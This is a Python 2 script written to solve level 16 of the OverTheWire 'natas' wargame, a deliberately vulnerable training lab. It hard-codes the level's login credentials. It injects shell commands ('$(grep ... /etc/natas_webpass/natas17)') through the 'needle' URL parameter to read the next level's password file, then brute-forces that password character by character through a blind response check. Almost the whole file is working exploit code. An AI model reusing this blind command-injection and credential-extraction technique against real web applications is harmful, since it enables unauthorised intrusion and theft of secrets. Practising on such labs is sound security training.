# AUTHOR: Federico de Faveri
# DATE:    Jun 2017
# PURPOSE: to bruteforce level 16 of natas wargame
# WEB ADDRESS: http://natas16.natas.labs.overthewire.org/
# SPECIAL THANKS: to mr. Godinho for the inspiration and some base code.

# Library to work with the POST requests
import requests

web_user = "natas16"
web_passwd = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Parsed characters, the ones that actually exist in the password
parsedChars = ''
# Final Password
password = ''
# Our target URL
target = 'http://%s:%s@natas16.natas.labs.overthewire.org/' % (web_user, web_passwd)
# The string that tells we're on the right path
existsStr = 'Output:\n<pre>\n</pre>'

# Checking if we can connect to the target, just in case...
r = requests.get(target)
if r.status_code != requests.codes.ok:
        raise ValueError('ERROR Couldn\'t connect to target')
else:
        print 'Target reachable. Starting character parsing...'

# The fun begin, let's see what characters are actually part of the pwd
for c in allChars:
        # Command injection #1
        r = requests.get(target+'?needle=$(grep '+c+' /etc/natas_webpass/natas17)hackers')
        # So does the password use this char?
        if r.content.find(existsStr) != -1:
                parsedChars += c
                print 'Used chars: ' + parsedChars

print 'Characters parsed. Starting brute force...'

# Assuming password is 32 characters long
for i in range(32):
        for c in parsedChars:
                # Command injection #2
                r = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)hackers')
                # Did we found the character at the i position of the password?
                if r.content.find(existsStr) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Done. Have fun!'